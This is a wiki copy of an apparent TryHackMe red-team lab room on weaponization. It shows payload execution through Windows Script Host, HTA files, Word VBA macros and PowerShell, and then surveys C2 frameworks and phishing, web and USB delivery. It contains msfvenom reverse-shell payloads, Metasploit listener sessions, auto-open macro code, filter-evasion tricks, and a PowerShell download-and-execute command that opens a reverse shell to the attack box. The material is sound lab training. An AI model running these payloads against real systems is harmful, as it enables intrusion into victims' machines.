@@ -1,0 +1,338 @@
+<!--
+title: Weaponisation
+description: 
+published: true
+date: 2022-10-25T13:07:12.403Z
+tags: 
+editor: ckeditor
+dateCreated: 2022-10-25T13:07:09.514Z
+-->
+
+<h1>What is Weaponization</h1>
+<p>Weaponization is the second stage of the Cyber Kill Chain model. In this stage, the attacker generates and develops their own malicious code using deliverable payloads such as word documents, PDFs, etc. [<a href="https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html">1</a>]. The weaponization stage aims to use the malicious weapon to exploit the target machine and gain initial access.</p>
+<p>Most organizations have Windows OS running, which is going to be a likely target. An organization's environment policy often blocks downloading and executing&nbsp;.exe&nbsp;files to avoid security violations. Therefore, red teamers rely upon building custom payloads sent via various channels such as phishing campaigns, social engineering, browser or software exploitation, USB, or web methods.</p>
+<p>The following graph is an example of weaponization, where a crafted custom PDF or Microsoft Office document is used to deliver a malicious payload. The custom payload is configured to connect back to the command and control environment of the red team infrastructure.</p>
+<figure class="image image_resized" style="width:821px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/734a353799fc9f3cd05bb7421ceedd00.png"></figure>
+<p>For more information about red team toolkits, please visit the following: a <a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development">GitHub repository</a> that has it all, including initial access, payload development, delivery methods, and others.</p>
+<p>Most organizations block or monitor the execution of&nbsp;.exe&nbsp;files within their controlled environment. For that reason, red teamers rely on executing payloads using other techniques, such as built-in windows scripting technologies. Therefore, this task focuses on various popular and effective scripting techniques, including:</p>
+<ul>
+  <li>The Windows Script Host (WSH)</li>
+  <li>An HTML Application (HTA)</li>
+  <li>Visual Basic Applications (VBA)</li>
+  <li>PowerShell (PSH)</li>
+</ul>
+<h1>Windows Scripting Host - WSH</h1>
+<p>Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.</p>
+<p>It is a Windows native engine, cscript.exe&nbsp;(for command-line scripts) and wscript.exe&nbsp;(for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs&nbsp;and vbe. For more information about VBScript, please visit <a href="https://en.wikipedia.org/wiki/VBScript">here</a>. It is important to note that the VBScript engine on a Windows operating system runs and executes applications with the same level of access and permission as a regular user; therefore, it is useful for the red teamers.</p>
+<p>Now let's write a simple&nbsp;VBScript code&nbsp;to create a windows message box that shows the&nbsp;Welcome to THM&nbsp;message. Make sure to save the following code into a file, for example,&nbsp;hello.vbs.</p>
+<pre><code class="language-javascript">Dim message 
+message = "Welcome to THM"
+MsgBox message</code></pre>
+<p>In the first line, we declared the&nbsp;message&nbsp;variable using&nbsp;Dim.&nbsp;Then we store a string value of&nbsp;Welcome to THM&nbsp;in the&nbsp;message&nbsp;variable. In the next line, we use the MsgBox function to show the content of the variable. For more information about the MsgBox function, please visit <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/sfw6660x(v=vs.84)?redirectedfrom=MSDN">here</a>. Then, we use wscript&nbsp;to run and execute the content of&nbsp;hello.vbs.&nbsp;As a result, A Windows message will pop up with&nbsp;the&nbsp;Welcome to THM&nbsp;message.</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f40a7711a408932981d827bfe6e522f3.png"></figure>
+<p>Now let's use the VBScript to run executable files. The following vbs code is to invoke the Windows calculator, proof that we can execute .exe files using the Windows native engine (WSH).</p>
+<pre><code class="language-javascript">Set shell = WScript.CreateObject("Wscript.Shell")
+shell.Run("C:\Windows\System32\calc.exe " &amp; WScript.ScriptFullName),0,True</code></pre>
+<p>We create an object of the WScript library using&nbsp;CreateObject&nbsp;to call the execution payload. Then, we utilize the&nbsp;Run&nbsp;method to execute the payload. For this task, we will&nbsp;run the&nbsp;Windows calculator&nbsp;calc.exe.&nbsp;</p>
+<p>To execute the exe file, we can run it using the wscript as follows,&nbsp;</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">c:\Windows\System32&gt;wscript c:\Users\thm\Desktop\payload.vbs</code></pre>
+<p>We can also run it via cscript as follows,</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">c:\Windows\System32&gt;cscript.exe c:\Users\thm\Desktop\payload.vbs</code></pre>
+<p>As a result, the Windows calculator will appear on the Desktop.</p>
+<figure class="image image_resized" style="width:440px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8c7cbe29ee437b83a244994621cf6996.png"></figure>
+<p>Another trick. If the VBS files are blacklisted, then we can rename the file to .txt file and run it using wscript as follows,</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">c:\Windows\System32&gt;wscript /e:VBScript c:\Users\thm\Desktop\payload.txt</code></pre>
+<p>The result will be as exact as executing the vbs files, which run the calc.exe binary.<br>&nbsp;</p>
+<figure class="image image_resized" style="width:641.987px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f6d6a5f824fa64750e8b15ce6ba07a7a.png"></figure>
+<h1>An HTML Application - HTA</h1>
+<p>HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic&nbsp;HTML&nbsp;pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool&nbsp;mshta&nbsp;is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer.&nbsp;</p>
+<p>In the following example, we will use an&nbsp;<a href="https://en.wikipedia.org/wiki/ActiveX">ActiveXObject</a>&nbsp;in our payload as proof of concept to execute&nbsp;cmd.exe. Consider the following HTML code.</p>
+<p>&nbsp;</p>
+<pre><code class="language-javascript">&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+	var c= 'cmd.exe'
+	new ActiveXObject('WScript.Shell').Run(c);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>Then serve the&nbsp;payload.hta&nbsp;from a web server, this could be done from the attacking machine as follows,</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@machine$ python3 -m http.server 8090
+Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)</code></pre>
+<p>On the victim machine, visit the malicious link using Microsoft Edge,&nbsp;http://10.8.232.37:8090/payload.hta. Note that the&nbsp;10.8.232.37&nbsp;is the AttackBox's IP address.</p>
+<figure class="image image_resized" style="width:378.5px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f3a719e8137e6fdca683eefbf373ea4f.png"></figure>
+<p style="text-align:center;">&nbsp;</p>
+<p>Once we press&nbsp;Run,&nbsp;the&nbsp;payload.hta&nbsp;gets executed, and then it will invoke the&nbsp;cmd.exe. The following figure shows that we have successfully executed the&nbsp;cmd.exe.</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/07c5180cd36650478806a1bf3d4595f2.png"></figure>
+<p><strong>HTA Reverse Connection</strong></p>
+<p>We can create a reverse shell payload as follows,</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of hta-psh file: 7692 bytes
+Saved as: thm.hta</code></pre>
+<p>We use the&nbsp;msfvenom&nbsp;from the&nbsp;Metasploit&nbsp;framework to generate a malicious payload to connect back to the attacking machine. We used the following payload to connect the&nbsp;windows/x64/shell_reverse_tcp&nbsp;to our IP and listening port.</p>
+<p>On the attacking machine, we need to listen to the port&nbsp;443&nbsp;using&nbsp;nc. Please note this port needs root privileges to open, or you can use different ones.</p>
+<p>Once the victim visits the malicious URL and hits run, we get the connection back.</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@machine$ sudo nc -lvp 443
+listening on [any] 443 ...
+10.8.232.37: inverse host lookup failed: Unknown host
+connect to [10.8.232.37] from (UNKNOWN) [10.10.201.254] 52910
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\thm\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads&gt;
+pState\Downloads&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet 4:
+
+   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
+   Link-local IPv6 Address . . . . . : fe80::fce4:699e:b440:7ff3%2
+   IPv4 Address. . . . . . . . . . . : 10.10.201.254
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 10.10.0.1</code></pre>
+<p>Malicious HTA via Metasploit&nbsp;</p>
+<p>There is another way to generate and serve malicious HTA files using the Metasploit framework. First, run the Metasploit framework using&nbsp;msfconsole -q&nbsp;command.&nbsp;Under the exploit section, there is&nbsp;exploit/windows/misc/hta_server,&nbsp;which requires selecting and setting information such as&nbsp;LHOST,&nbsp;LPORT,&nbsp;SRVHOST,&nbsp;Payload,&nbsp;and finally, executing&nbsp;exploit&nbsp;to run the module.</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">msf6 &gt; use exploit/windows/misc/hta_server
+msf6 exploit(windows/misc/hta_server) &gt; set LHOST 10.8.232.37
+LHOST =&gt; 10.8.232.37
+msf6 exploit(windows/misc/hta_server) &gt; set LPORT 443
+LPORT =&gt; 443
+msf6 exploit(windows/misc/hta_server) &gt; set SRVHOST 10.8.232.37
+SRVHOST =&gt; 10.8.232.37
+msf6 exploit(windows/misc/hta_server) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf6 exploit(windows/misc/hta_server) &gt; exploit
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/misc/hta_server) &gt;
+[*] Started reverse TCP handler on 10.8.232.37:443
+[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
+[*] Server started.
+</code></pre>
+<p>On the victim machine, once we visit the malicious HTA file that was provided as a URL by Metasploit, we should receive a reverse connection.</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@machine$ [*] 10.10.201.254    hta_server - Delivering Payload
+[*] Sending stage (175174 bytes) to 10.10.201.254
+[*] Meterpreter session 1 opened (10.8.232.37:443 -&gt; 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600
+msf6 exploit(windows/misc/hta_server) &gt; sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter &gt; sysinfo
+Computer        : DESKTOP-1AU6NT4
+OS              : Windows 10 (10.0 Build 14393).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 3
+Meterpreter     : x86/windows
+meterpreter &gt; shell
+Process 4124 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\app&gt;</code></pre>
+<h1>Visual Basic for Application - VBA</h1>
+<p>VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications.&nbsp;<br>&nbsp;</p>
+<p>Macros are Microsoft Office applications that contain embedded code written in a programming language known as Visual Basic for Applications (VBA). It is used to create custom functions to speed up manual tasks by creating automated processes.&nbsp;One of VBA's features is accessing the Windows Application Programming Interface (<a href="https://en.wikipedia.org/wiki/Windows_API">API</a>)&nbsp;and other low-level functionality. For more information about VBA, visit <a href="https://en.wikipedia.org/wiki/Visual_Basic_for_Applications">here</a>.&nbsp;</p>
+<p>In this task, we will discuss the basics of VBA and the ways the adversary uses macros to create malicious Microsoft documents. To follow up along with the content of this task, make sure to deploy the attached Windows machine in Task 2. When it is ready, it will be available through in-browser access.</p>
+<p>Now open Microsoft Word 2016 from the Start menu. Once it is opened, we close the product key window since we will use it within the seven-day trial period.</p>
+<figure class="image image_resized" style="width:546px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2ceed0307819cf06500e6524a5f632d7.png"></figure>
+<p style="text-align:center;"><br>&nbsp;</p>
+<p>&nbsp;</p>
+<p>Next, make sure to accept the Microsoft Office license agreement that shows after closing the product key window.</p>
+<figure class="image image_resized" style="width:539px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/feb2f077507c6c242658e76ee88fb544.png"></figure>
+<p>Now create a new blank Microsoft document to create our first&nbsp;macro. The goal is to discuss the basics of the language and show how to run it when a Microsoft Word document gets opened. First, we need to open the Visual Basic Editor by selecting&nbsp;view&nbsp;→&nbsp;macros. The Macros window shows to create our own macro within the document.</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5e12755e9b891865c6ef07e25047060b.png"></figure>
+<p style="text-align:center;"><br>&nbsp;</p>
+<p>In the&nbsp;Macro name&nbsp;section, we choose to name our macro as&nbsp;THM. Note that we need&nbsp;to select from the&nbsp;Macros in&nbsp;list Document1&nbsp;and finally select&nbsp;create. Next, the Microsoft Visual Basic for Application editor shows where we can write VBA code. Let's try to show a message box with the following message:&nbsp;Welcome to Weaponization Room!. We can do that using the&nbsp;MsgBox&nbsp;function as follows:</p>
+<pre><code class="language-javascript">Sub THM()
+  MsgBox ("Welcome to Weaponization Room!")
+End Sub</code></pre>
+<p>Finally, run the macro by F5 or Run → Run Sub/UserForm.</p>
+<p>Now in order to execute the VBA code automatically once the document gets opened, we can use built-in functions such as&nbsp;AutoOpen&nbsp;and&nbsp;Document_open.&nbsp;Note that we need to specify the function name that needs to be run once the document opens, which in our case, is the&nbsp;THM&nbsp;function.</p>
+<pre><code class="language-javascript">Sub Document_Open()
+  THM
+End Sub
+
+Sub AutoOpen()
+  THM
+End Sub
+
+Sub THM()
+   MsgBox ("Welcome to Weaponization Room!")
+End Sub</code></pre>
+<p>It is important to note that to make the macro work, we need to save it in Macro-Enabled format such as .doc and&nbsp;docm. Now let's save the file as Word 97-2003 Template where the Macro is enabled by going to File → save Document1 and save as type → Word 97-2003 Document&nbsp;and finally, save.</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a5e35b7436173da709dae5695c34d4f9.png"></figure>
+<p style="text-align:center;"><br>&nbsp;</p>
+<p>Let's close the Word document that we saved.&nbsp;If we reopen the document file, Microsoft Word will show a security message indicating that Macros have been disabled and give us the option to enable it. Let's enable it and move forward to check out the result.</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e140bfbce59d6cf3e71489dba094adc2.png"></figure>
+<p style="text-align:center;"><br>&nbsp;</p>
+<p>Once we allowed the&nbsp;Enable Content, our macro gets executed as shown,</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ca228c238732dcdf21139317992a0083.png"></figure>
+<p style="text-align:center;"><br>&nbsp;</p>
+<p>Now edit the word document and create a macro function that executes a calc.exe&nbsp;or any executable file as proof of concept as follows,<br>&nbsp;</p>
+<pre><code class="language-javascript">Sub PoC()
+	Dim payload As String
+	payload = "calc.exe"
+	CreateObject("Wscript.Shell").Run payload,0
+End Sub</code></pre>
+<p>To explain the code in detail, with&nbsp;Dim payload As String, we declare payload&nbsp;variable as a string using Dim&nbsp;keyword. With&nbsp;payload = "calc.exe" we are specifying the payload name and finally with&nbsp;CreateObject("Wscript.Shell").Run payload we create a Windows Scripting Host (WSH) object and run the payload. Note that if you want to rename the function name, then you must include the function name in the&nbsp;&nbsp;AutoOpen()&nbsp;and&nbsp;Document_open()&nbsp;functions too.</p>
+<p>Make sure to test your code before saving the document by using the running feature in the editor. Make sure to create AutoOpen() and Document_open() functions before saving the document. Once the code works, now save the file and try to open it again.<br>&nbsp;</p>
+<figure class="image image_resized" style="width:347.539px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5c80382621d3fcb578a9e128ca821e71.png"></figure>
+<p>It is important to mention that we can combine VBAs with previously covered methods, such as HTAs and WSH. VBAs/macros by themselves do not inherently bypass any detections.</p>
+<p><strong>Answer the questions below</strong></p>
+<p>&nbsp;</p>
+<p>Now let's create an in-memory meterpreter payload using the Metasploit framework to receive a reverse shell. First, from the AttackBox, we create our meterpreter payload using&nbsp;msfvenom. We need to specify the&nbsp;Payload,&nbsp;LHOST,&nbsp;and&nbsp;LPORT,&nbsp;which match what is in the Metasploit framework. Note that we specify the payload as&nbsp;VBA&nbsp;to use it as a macro.</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 341 bytes
+Final size of vba file: 2698 bytes
+</code></pre>
+<p>The value of the&nbsp;LHOST&nbsp;in the above terminal&nbsp;is an example of AttackBox's IP address that we used. In your case, you need to specify the IP address of your AttackBox.</p>
+<p><strong>Import to note</strong> that one modification needs to be done to make this work.&nbsp; The output will be working on an MS excel sheet. Therefore, change the&nbsp;Workbook_Open()&nbsp;to&nbsp;Document_Open()&nbsp;to make it suitable for MS word documents.</p>
+<p>Now copy the output and save it into the macro editor of the MS word document, as we showed previously.</p>
+<p>From the attacking machine, run the Metasploit framework and set the listener as follows:</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@AttackBox$ msfconsole -q
+msf5 &gt; use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) &gt; set LHOST 10.50.159.15
+LHOST =&gt; 10.50.159.15
+msf5 exploit(multi/handler) &gt; set LPORT 443
+LPORT =&gt; 443
+msf5 exploit(multi/handler) &gt; exploit 
+
+[*] Started reverse TCP handler on 10.50.159.15:443 
+</code></pre>
+<p>Once the malicious MS word document is opened on the victim machine, we should receive a reverse shell.</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">msf5 exploit(multi/handler) &gt; exploit 
+
+[*] Started reverse TCP handler on 10.50.159.15:443 
+[*] Sending stage (176195 bytes) to 10.10.215.43
+[*] Meterpreter session 1 opened (10.50.159.15:443 -&gt; 10.10.215.43:50209) at 2021-12-13 10:46:05 +0000
+meterpreter &gt;</code></pre>
+<h1><br>PowerShell - PSH</h1>
+<p>PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in&nbsp;.NET&nbsp;with some exceptions for legacy uses. Check out the TryHackMe room, <a href="https://tryhackme.com/room/powershell">Hacking with PowerShell for more information about PowerShell</a>.<br>&nbsp;</p>
+<p>Red teamers rely on PowerShell in performing various activities, including initial access, system enumerations, and many others.&nbsp;Let's start by creating a straightforward PowerShell script that prints "Welcome to the Weaponization Room!" as follows,</p>
+<pre><code class="language-plaintext">Write-Output "Welcome to the Weaponization Room!"</code></pre>
+<p>Save the file as&nbsp;thm.ps1.&nbsp;With the&nbsp;Write-Output, we print the message "Welcome to the Weaponization Room!" to the command prompt.&nbsp;Now let's run it and see the result.</p>
+<p>CMD</p>
+<pre><code class="language-plaintext">C:\Users\thm\Desktop&gt;powershell -File thm.ps1
+File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
+information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
+    + CategoryInfo          : SecurityError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+
+C:\Users\thm\Desktop&gt;
+</code></pre>
+<p>Execution Policy</p>
+<p>PowerShell's execution policy is a&nbsp;<strong>security option</strong> to protect the system from running malicious scripts. By default, Microsoft disables executing PowerShell scripts .ps1 for security purposes. The PowerShell execution policy is set to Restricted, which means it permits individual commands but not run any scripts.<br>&nbsp;</p>
+<p>You can determine the current PowerShell setting of your Windows as follows,</p>
+<p>CMD</p>
+<pre><code class="language-plaintext">PS C:\Users\thm&gt; Get-ExecutionPolicy
+Restricted</code></pre>
+<p>We can also easily change the PowerShell execution policy by running:</p>
+<p>CMD</p>
+<pre><code class="language-plaintext">PS C:\Users\thm\Desktop&gt; Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
+
+Execution Policy Change
+The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
+you to the security risks described in the about_Execution_Policies help topic at
+http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
+[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A</code></pre>
+<p>&nbsp;</p>
+<p>Bypass Execution Policy</p>
+<p>Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the PowerShell command to change it to your desired setting. For example, we can change it to bypass policy which means nothing is blocked or restricted. This is useful since that lets us run our own PowerShell scripts.<br>&nbsp;</p>
+<p>In order to make sure our PowerShell file gets executed, we need to provide the bypass option in the arguments as follows,</p>
+<p>CMD</p>
+<pre><code class="language-plaintext">C:\Users\thm\Desktop&gt;powershell -ex bypass -File thm.ps1
+Welcome to Weaponization Room!</code></pre>
+<p>Now, let's try to get a reverse shell using one of the tools written in PowerShell, which is powercat. On your AttackBox, download it from GitHub and run a webserver to deliver the payload.</p>
+<p>&nbsp;</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@machine$ git clone https://github.com/besimorhino/powercat.git
+Cloning into 'powercat'...
+remote: Enumerating objects: 239, done.
+remote: Counting objects: 100% (4/4), done.
+remote: Compressing objects: 100% (4/4), done.
+remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
+Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done.
+Resolving deltas: 100% (72/72), done.</code></pre>
+<p>Now, we need to set up a web server on that AttackBox to serve the powercat.ps1 that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. In our case, we will be using port&nbsp;8080.</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@machine$ cd powercat
+user@machine$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...</code></pre>
+<p>On the AttackBox, we need to listen on port 1337 using nc to receive the connection back from the victim.</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@machine$ nc -lvp 1337</code></pre>
+<p>Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows,</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">C:\Users\thm\Desktop&gt; powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"</code></pre>
+<p>Now that we have executed the command above, the victim machine downloads the&nbsp;powercat.ps1&nbsp;&nbsp;payload from our web server (on the AttackBox) and then executes it locally on the target using cmd.exe&nbsp;and sends a connection back to the AttackBox that is listening on port&nbsp;1337. After a couple of seconds, we should receive the connection call back:</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@machine$ nc -lvp 1337  listening on [any] 1337 ...
+10.10.12.53: inverse host lookup failed: Unknown host
+connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\thm&gt;</code></pre>
+<h1>Command and Control</h1>
+<p>This task introduces the basic concept of Command and Control (C2) frameworks used in Red team operations.</p>
+<figure class="image image_resized" style="width:750px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9671adc6cb778fa7b151921f753e2f96.jpg"></figure>
+<p>What is Command and Control (C2)?</p>
+<p>C2 frameworks are post-exploitation frameworks that allow red teamers to collaborate and control compromised machines. C2 is considered one of the most important tools for red teamers during offensive cyber operations. C2 frameworks provide fast and straightforward approaches to:</p>
+<ul>
+  <li>Generate various malicious payloads</li>
+  <li>Enumerate the compromised machine/networks</li>
+  <li>Perform privilege escalation and pivoting</li>
+  <li>Lateral movement&nbsp;</li>
+  <li>And many others</li>
+</ul>
+<p>Some popular C2 frameworks that we'll briefly highlight are Cobalt Strike, PowerShell Empire, Metasploit. Most of these frameworks aim to support a convenient environment to share and communicate&nbsp;between red team operations once the initial access is gained to a system.</p>
+<p><strong>Cobalt Strike</strong></p>
+<p>Cobalt Strike is a commercial framework that focuses on Adversary Simulations and Red Team Operations. It is a combination of remote access tools, post-exploitation capabilities, and a unique reporting system. It provides an agent with advanced techniques to establish covert communications and perform various operations,&nbsp;including key-logging, files upload and download, VPN deployment, privilege escalation techniques, mimikatz, port scanning, and the most advanced lateral movements.</p>
+<p><strong>PowerShell Empire</strong></p>
+<p>PowerShell Empire is an open-source framework that helps red team operators and pen testers collaborate across multiple servers using keys and shared passwords. It is an exploitation framework based on PowerShell and Python agents. PowerShell Empire focuses on client-side and post-exploitation of Windows and Active Directory environment.&nbsp;If you want to learn more about PowerShell Empire, we suggest trying out this room: <a href="https://tryhackme.com/room/rppsempire">Empire</a>.</p>
+<p><strong>Metasploit&nbsp;</strong></p>
+<p>Metasploit is a widely used exploitation framework that offers various techniques and tools to perform hacking easily. It is an open-source framework and is considered one of the primary tools for pentesting and red team operations. Metasploit is one of the tools we use in this room to generate payload for our weaponization stage.&nbsp;If you want to learn more about the Metasploit framework, we suggest trying out the following two rooms: <a href="https://tryhackme.com/room/metasploitintro">Metasploit: Introduction</a> and <a href="https://tryhackme.com/room/rpmetasploit">Metasploit</a>.</p>
+<h1>Delivery Techniques</h1>
+<p>Delivery techniques are one of the important factors for getting initial access. They have to look professional, legitimate, and convincing to the victim in order to follow through with the content.</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a5ca83fe7cfa5020a7bcb950ef90c8ec.png"></figure>
+<p>Email Delivery</p>
+<p>It is a common method to use in order to send the payload by sending a phishing email with a link or attachment. For more info, visit <a href="https://attack.mitre.org/techniques/T1566/001/">here</a>. This method attaches a malicious file that could be the type we mentioned earlier. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim's network or host.</p>
+<p>The red teamers should have their own infrastructure for phishing purposes. Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), and DNS Pointer (PTR) record.</p>
+<p>The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations.</p>
+<p>Another interesting method would be to use a compromised email account within a company to send phishing emails within the company or to others. The compromised email could be hacked by phishing or by other techniques such as password spraying attacks.</p>
+<figure class="image image_resized" style="width:396.48px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/1a0948c69efa832d68512b03357a7cbc.png"></figure>
+<h3>Web Delivery<br>&nbsp;</h3>
+<p>Another method is hosting malicious payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and TLS (Transport Layer Security) certificate. For more information, visit <a href="https://attack.mitre.org/techniques/T1189/">here</a>.</p>
+<p>This method includes other techniques such as social engineering the victim to visit or download the malicious file. A URL shortener could be helpful when using this method.</p>
+<p>In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them in phishing emails or web delivery techniques to gain access to the victim machine.</p>
+<figure class="image image_resized" style="width:397.5px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/d374b6e862a19fb8be2a723f3e20884f.jpg"></figure>
+<p><strong>USB Delivery</strong></p>
+<p>This method requires the victim to plug in the malicious USB physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. For more information about USB delivery, visit <a href="https://attack.mitre.org/techniques/T1091/">here</a>.</p>
+<p>Often, organizations establish strong policies such as disabling USB usage within their organization environment for security purposes. While other organizations allow it in the target environment.</p>
+<p>Common USB attacks used to weaponize USB devices include <a href="https://shop.hak5.org/products/usb-rubber-ducky-deluxe">Rubber Ducky</a> and <a href="https://www.minitool.com/news/usbharpoon.html">USBHarpoon</a>, charging&nbsp;USB cable, such as&nbsp;<a href="https://shop.hak5.org/products/omg-cable">O.MG Cable</a>.</p>
